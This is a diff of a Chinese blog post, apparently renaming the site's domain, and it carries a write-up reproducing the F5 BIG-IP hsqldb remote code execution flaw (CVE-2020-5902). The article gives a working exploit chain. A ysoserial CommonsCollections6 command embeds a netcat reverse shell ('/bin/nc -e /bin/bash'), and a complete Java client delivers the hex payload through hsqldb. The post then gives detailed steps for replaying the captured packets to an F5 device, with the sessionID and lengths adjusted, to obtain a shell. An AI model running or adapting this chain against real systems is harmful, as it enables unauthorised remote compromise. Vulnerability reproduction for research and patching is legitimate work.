@@ -9,33 +9,33 @@
     <meta name="description" content="看了下F5 hsqldb漏洞，在Github上可以找到POC，但是却一直复现不成功。原因是因为F5使用了HTTPS导致hsqldb连接失败。 看到了Longofo大佬写的F5 BIG-IP hsqldb(CVE-2020-5902)漏洞踩坑分析，大体思路是可以先本地搭建hsqlServlet，然后本地复现漏洞并抓取数据包，最后利用抓到的数据包重放到F5。自己按照文章里面的思路折腾了一篇，捣鼓大半天">
 <meta property="og:type" content="article">
 <meta property="og:title" content="F5 hsqldb漏洞踩坑笔记">
-<meta property="og:url" content="http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/index.html">
-<meta property="og:site_name" content="夏殇">
+<meta property="og:url" content="http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="长夏">
 <meta property="og:description" content="看了下F5 hsqldb漏洞，在Github上可以找到POC，但是却一直复现不成功。原因是因为F5使用了HTTPS导致hsqldb连接失败。 看到了Longofo大佬写的F5 BIG-IP hsqldb(CVE-2020-5902)漏洞踩坑分析，大体思路是可以先本地搭建hsqlServlet，然后本地复现漏洞并抓取数据包，最后利用抓到的数据包重放到F5。自己按照文章里面的思路折腾了一篇，捣鼓大半天">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/1.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/2.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/3.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/4.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/5.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/6.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/7.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/8.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/9.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/10.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/11.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/12.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/13.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/14.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/15.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/16.png">
-<meta property="og:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/17.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/1.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/2.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/3.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/4.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/5.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/6.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/7.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/8.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/9.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/10.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/11.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/12.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/13.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/14.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/15.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/16.png">
+<meta property="og:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/17.png">
 <meta property="article:published_time" content="2020-07-17T11:54:27.000Z">
-<meta property="article:modified_time" content="2020-07-17T11:38:35.444Z">
-<meta property="article:author" content="夏殇">
+<meta property="article:modified_time" content="2022-04-17T14:46:57.883Z">
+<meta property="article:author" content="长夏">
 <meta property="article:tag" content="反序列漏洞">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/1.png">
+<meta name="twitter:image" content="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/1.png">
     
     
         
@@ -69,7 +69,7 @@
     <!-- rss -->
     
     
-      <link rel="alternate" href="/true" title="夏殇" type="application/atom+xml" />
+      <link rel="alternate" href="/true" title="长夏" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -85,11 +85,11 @@
          
           <li><a href="/">首页</a></li>
          
-          <li><a href="/about/">关于</a></li>
-         
           <li><a href="/archives/">归档</a></li>
          
           <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/about/">关于</a></li>
         
       </ul>
     </span>
@@ -113,17 +113,17 @@
     <br/>
     <div id="share" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&text=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&is_video=false&description=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=F5 hsqldb漏洞踩坑笔记&body=Check out this article: http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&name=F5 hsqldb漏洞踩坑笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&t=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&text=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&is_video=false&description=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=F5 hsqldb漏洞踩坑笔记&body=Check out this article: http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&title=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&name=F5 hsqldb漏洞踩坑笔记&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://changxia.com.cn/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&t=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
 </ul>
 
     </div>
@@ -147,7 +147,7 @@
 
     <div class="meta">
       <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">夏殇</span>
+        <span itemprop="name">长夏</span>
       </span>
       
     <div class="postdate">
@@ -177,29 +177,29 @@
   
 
   <div class="content" itemprop="articleBody">
-    <p>看了下F5 hsqldb漏洞，在Github上可以找到<a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902" target="_blank" rel="noopener">POC</a>，但是却一直复现不成功。原因是因为F5使用了HTTPS导致hsqldb连接失败。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/1.png" alt=""></p>
+    <p>看了下F5 hsqldb漏洞，在Github上可以找到<a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902" target="_blank" rel="noopener">POC</a>，但是却一直复现不成功。原因是因为F5使用了HTTPS导致hsqldb连接失败。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/1.png" alt=""></p>
 <p>看到了Longofo大佬写的<a href="https://paper.seebug.org/1271/" target="_blank" rel="noopener">F5 BIG-IP hsqldb(CVE-2020-5902)漏洞踩坑分析</a>，大体思路是可以先本地搭建hsqlServlet，然后本地复现漏洞并抓取数据包，最后利用抓到的数据包重放到F5。自己按照文章里面的思路折腾了一篇，捣鼓大半天后终于成功了。这里记录一下复现的坑。</p>
-<h2 id="0x1-IDEA搭建hsqlServlet"><a href="#0x1-IDEA搭建hsqlServlet" class="headerlink" title="0x1 IDEA搭建hsqlServlet"></a>0x1 IDEA搭建hsqlServlet</h2><p>这一步相对比较简单，hsqldb本身提供了Servlet模式，直接拿来用就行。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/2.png" alt=""></p>
-<p>访问出现以下界面，环境搭建成功。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/3.png" alt=""></p>
+<h2 id="0x1-IDEA搭建hsqlServlet"><a href="#0x1-IDEA搭建hsqlServlet" class="headerlink" title="0x1 IDEA搭建hsqlServlet"></a>0x1 IDEA搭建hsqlServlet</h2><p>这一步相对比较简单，hsqldb本身提供了Servlet模式，直接拿来用就行。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/2.png" alt=""></p>
+<p>访问出现以下界面，环境搭建成功。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/3.png" alt=""></p>
 <h2 id="0x2-本地复现"><a href="#0x2-本地复现" class="headerlink" title="0x2 本地复现"></a>0x2 本地复现</h2><p>这一步基本上就是按照Github上POC的流程走一遍。<br>从CVE-2020-5902.sh里提取出关键的两个过程，先尝试弹个计算器吧。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-SNAPSHOT.jar \</span><br><span class="line">     CommonsCollections6 \</span><br><span class="line">     &quot;&#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;bash $localip $port&quot; &gt; nc.class  #使用ysoserial生成POC，这里使用的payload是CommonsCollections6</span><br><span class="line"></span><br><span class="line">xxd -p nc.class | xargs | sed -e &#39;s&#x2F; &#x2F;&#x2F;g&#39; | dd conv&#x3D;ucase 2&gt;&#x2F;dev&#x2F;null &gt; payload.hex  #生成十六进制编码的POC</span><br></pre></td></tr></table></figure>
-<p><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/4.png" alt=""></p>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/4.png" alt=""></p>
 <p>稍微改一下f5RCE.java。运行后成功弹出计算器。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">import java.sql.Connection;</span><br><span class="line">import java.sql.DriverManager;</span><br><span class="line">import java.sql.Statement;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import org.hsqldb.lib.StringConverter;</span><br><span class="line"></span><br><span class="line">public class F5RCE &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Connection connection;</span><br><span class="line">        Statement statement;</span><br><span class="line">        String pfile &#x3D; &quot;&#x2F;Users&#x2F;xiashang&#x2F;Downloads&#x2F;CVE-2020-5902&#x2F;payload.hex&quot;;</span><br><span class="line"></span><br><span class="line">        String payload &#x3D; null;</span><br><span class="line">        try &#123;</span><br><span class="line">            payload &#x3D; new String(Files.readAllBytes(Paths.get(pfile)));</span><br><span class="line">            payload &#x3D; payload.replaceAll(&quot;(\\n|\\r)&quot;,&quot;&quot;);</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String dburl &#x3D; &quot;jdbc:hsqldb:http:&#x2F;&#x2F;localhost:8090&#x2F;helloworld_war_exploded&#x2F;hsql&#x2F;&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Class.forName(&quot;org.hsqldb.jdbcDriver&quot;);</span><br><span class="line">            connection &#x3D; DriverManager.getConnection(dburl, &quot;sa&quot;,&quot;&quot;);</span><br><span class="line">            statement &#x3D; connection.createStatement();</span><br><span class="line">            statement.execute(&quot;call \&quot;java.lang.System.setProperty\&quot;(&#39;org.apache.commons.collections.enableUnsafeSerialization&#39;,&#39;true&#39;)&quot;);</span><br><span class="line">            statement.execute(&quot;call \&quot;org.hsqldb.util.ScriptTool.main\&quot;(&#39;&quot; + payload +&quot;&#39;);&quot;);</span><br><span class="line">        &#125; catch (java.sql.SQLException sqle) &#123;</span><br><span class="line">            &#x2F;&#x2F; ignore java.sql.SQLException: S1000</span><br><span class="line">            &#x2F;&#x2F; General error java.lang.IllegalArgumentException: argument type mismatch</span><br><span class="line">            if(sqle.getSQLState().equals(&quot;S1000&quot;) &amp;&amp; sqle.getErrorCode() &#x3D;&#x3D; 40) &#123;</span><br><span class="line">                System.out.println(&quot;Payload executed&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                System.out.println(&quot;Unexpected SQL error&quot;);</span><br><span class="line">                sqle.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (ClassNotFoundException cne) &#123;</span><br><span class="line">            System.err.println(&quot;Error loading db driver&quot;);</span><br><span class="line">            cne.printStackTrace();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/5.png" alt=""></p>
-<h2 id="0x3-抓取数据包"><a href="#0x3-抓取数据包" class="headerlink" title="0x3 抓取数据包"></a>0x3 抓取数据包</h2><p>重新构造反弹的POC后，抓取数据包，关键数据包有三个。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/6.png" alt=""></p>
-<p>三个数据包分别对应以下三个过程，第一步先认证，然后执行两条命令。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/7.png" alt=""></p>
-<h2 id="0x4-重放数据包"><a href="#0x4-重放数据包" class="headerlink" title="0x4 重放数据包"></a>0x4 重放数据包</h2><p>利用burpsuite重放数据包到F5，这里需要注意的是直接重放数据包不行的，因为本地抓的数据包sessionID和F5的不一致，会导致500报错。在重放第一数据包进行认证时时需要记录下来F5返回的sessionID。然后修改第二个和第三个数据包的sessionID再发送。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/8.png" alt=""></p>
-<p>还有一个坑就是个别版本的burpsuite在粘贴请求包时会在最前面多加了3个00字节，如果有多加的话需要把前面3个00字节删除。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/9.png" alt=""></p>
-<p>详细的复现过程如下：<br>第一步，先发送第一个认证数据包，记录下来返回包的sessionID，sessionID在13-16个字节，比如这里的是0000001f。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/10.png" alt=""></p>
-<p>第二步，将第二个请求包的sessionID修改为第一步记录下来的sessionID，如果返回java.lang.String      true证明命令执行成功。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/11.png" alt=""></p>
-<p>第三步，还是将第三个请求包的sessionID修改为第一步记录下来的sessionID。发送后成功反弹shell。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/12.png" alt=""></p>
+<p><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/5.png" alt=""></p>
+<h2 id="0x3-抓取数据包"><a href="#0x3-抓取数据包" class="headerlink" title="0x3 抓取数据包"></a>0x3 抓取数据包</h2><p>重新构造反弹的POC后，抓取数据包，关键数据包有三个。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/6.png" alt=""></p>
+<p>三个数据包分别对应以下三个过程，第一步先认证，然后执行两条命令。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/7.png" alt=""></p>
+<h2 id="0x4-重放数据包"><a href="#0x4-重放数据包" class="headerlink" title="0x4 重放数据包"></a>0x4 重放数据包</h2><p>利用burpsuite重放数据包到F5，这里需要注意的是直接重放数据包不行的，因为本地抓的数据包sessionID和F5的不一致，会导致500报错。在重放第一数据包进行认证时时需要记录下来F5返回的sessionID。然后修改第二个和第三个数据包的sessionID再发送。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/8.png" alt=""></p>
+<p>还有一个坑就是个别版本的burpsuite在粘贴请求包时会在最前面多加了3个00字节，如果有多加的话需要把前面3个00字节删除。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/9.png" alt=""></p>
+<p>详细的复现过程如下：<br>第一步，先发送第一个认证数据包，记录下来返回包的sessionID，sessionID在13-16个字节，比如这里的是0000001f。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/10.png" alt=""></p>
+<p>第二步，将第二个请求包的sessionID修改为第一步记录下来的sessionID，如果返回java.lang.String      true证明命令执行成功。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/11.png" alt=""></p>
+<p>第三步，还是将第三个请求包的sessionID修改为第一步记录下来的sessionID。发送后成功反弹shell。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/12.png" alt=""></p>
 <p>有了数据包之后后面再构造不同的payload其实也挺方便的了，不需要再重复本地抓包去改了。第一个包直接直接重放，第二个包只需要修改sessionID即可，第三个包需要修改的稍微会多一点，需要分别修改总长度、sessionID、命令长度。这里主要看一下第三个数据包怎么修改。</p>
-<p>生成需要执行的命令并替换到第三个数据包ACED开头序列化数据部分，然后修改sessionID为第一步的sessionID。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/13.png" alt=""></p>
-<p>计算命令的长度，命令部分从call开始一直到最后。这里算出来的长度是2671，转成十六进制是0a6f。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/14.png" alt=""></p>
-<p>修改数据包部分命令长度，长度就是call前面，比较容易找。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/15.png" alt=""></p>
-<p>改完上面步骤之后先发送一个数据包过去，这个数据包可能还是会报错，因为总长度还没改，发送之后burpsuit会自动帮我们算好总长度，比如这里是2699，转成十六进制是0a8b。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/16.png" alt=""></p>
-<p>最后修改总长度，总长度就在开头的4个字节。本地成功监听到F5发来的HTTP请求。<br><img src="https://xiashang-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/17.png" alt=""></p>
+<p>生成需要执行的命令并替换到第三个数据包ACED开头序列化数据部分，然后修改sessionID为第一步的sessionID。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/13.png" alt=""></p>
+<p>计算命令的长度，命令部分从call开始一直到最后。这里算出来的长度是2671，转成十六进制是0a6f。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/14.png" alt=""></p>
+<p>修改数据包部分命令长度，长度就是call前面，比较容易找。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/15.png" alt=""></p>
+<p>改完上面步骤之后先发送一个数据包过去，这个数据包可能还是会报错，因为总长度还没改，发送之后burpsuit会自动帮我们算好总长度，比如这里是2699，转成十六进制是0a8b。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/16.png" alt=""></p>
+<p>最后修改总长度，总长度就在开头的4个字节。本地成功监听到F5发来的HTTP请求。<br><img src="https://changxia-1257751451.cos.ap-chengdu.myqcloud.com/CVE-2020-5902/17.png" alt=""></p>
 
   </div>
 </article>
@@ -215,11 +215,11 @@
          
           <li><a href="/">首页</a></li>
          
-          <li><a href="/about/">关于</a></li>
-         
           <li><a href="/archives/">归档</a></li>
          
           <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/about/">关于</a></li>
         
       </ul>
     </div>
@@ -230,17 +230,17 @@
 
     <div id="share-footer" style="display: none">
       <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=http://xiashang.xyz/2020/07/17/F5-hsqldb%E6%BC%8F%E6%B4%9E%E8%B8%A9%E5%9D%91%E7%AC%94%E8%AE%B0/&text=F5 hsqldb漏洞踩坑笔记" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
